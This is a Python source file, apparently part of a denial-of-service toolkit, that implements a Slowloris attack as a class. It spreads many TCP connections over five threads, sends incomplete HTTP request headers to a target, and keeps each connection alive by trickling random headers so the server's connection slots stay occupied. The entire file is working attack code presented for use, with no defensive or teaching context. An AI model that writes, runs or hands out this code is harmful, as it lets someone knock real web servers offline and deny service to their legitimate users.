"""
Slowloris attack module
"""

import socket
import time
import threading
import random
import string
from config.settings import USER_AGENTS
from utils.helpers import get_random_headers

class SlowlorisAttack:
    def __init__(self, target_config, config_manager, stats_manager):
        self.target_ip = target_config["ip"]
        self.target_port = target_config["port"]
        self.target_uri = target_config["uri"]
        self.config_manager = config_manager
        self.stats_manager = stats_manager
        self.is_running = False
        self.sockets_pool = []
        self.threads = []
    
    def start(self):
        """Start Slowloris attack"""
        self.is_running = True
        
        # Start multiple slowloris clusters
        for _ in range(5):  # 5 clusters
            thread = threading.Thread(target=self._slowloris_cluster, daemon=True)
            thread.start()
            self.threads.append(thread)
            time.sleep(0.5)
    
    def stop(self):
        """Stop Slowloris attack"""
        self.is_running = False
        self._cleanup_sockets()
        
        for thread in self.threads:
            thread.join(timeout=2)
    
    def _slowloris_cluster(self):
        """Slowloris cluster worker"""
        config = self.config_manager.get_attack_config("slowloris")
        cluster_sockets = []
        
        try:
            # Create multiple sockets
            for _ in range(config["connections"] // 5):  # Divide among clusters
                if not self.is_running:
                    break
                    
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    sock.connect((self.target_ip, self.target_port))
                    
                    # Send initial headers
                    sock.send(f"GET {self.target_uri}?slowloris_{random.randint(10000,99999)} HTTP/1.1\r\n".encode())
                    sock.send(f"Host: {self.target_ip}\r\n".encode())
                    sock.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode())
                    
                    cluster_sockets.append(sock)
                    self.sockets_pool.append(sock)
                    
                    # Update stats
                    self.stats_manager.update_slowloris_connections(len(self.sockets_pool))
                    
                except Exception:
                    continue
            
            # Keep connections alive
            while self.is_running and cluster_sockets:
                for sock in cluster_sockets[:]:
                    try:
                        header = f"X-{random.choice(string.ascii_uppercase)}-KeepAlive: {random.randint(1000,9999)}\r\n"
                        sock.send(header.encode())
                    except:
                        cluster_sockets.remove(sock)
                        if sock in self.sockets_pool:
                            self.sockets_pool.remove(sock)
                        self.stats_manager.update_slowloris_connections(len(self.sockets_pool))
                
                time.sleep(config["keep_alive_interval"])
                
        except Exception as e:
            pass
        finally:
            self._cleanup_cluster_sockets(cluster_sockets)
    
    def _cleanup_sockets(self):
        """Cleanup all sockets"""
        for sock in self.sockets_pool:
            try:
                sock.close()
            except:
                pass
        self.sockets_pool.clear()
        self.stats_manager.update_slowloris_connections(0)
    
    def _cleanup_cluster_sockets(self, cluster_sockets):
        """Cleanup cluster sockets"""
        for sock in cluster_sockets:
            try:
                sock.close()
            except:
                pass
            if sock in self.sockets_pool:
                self.sockets_pool.remove(sock)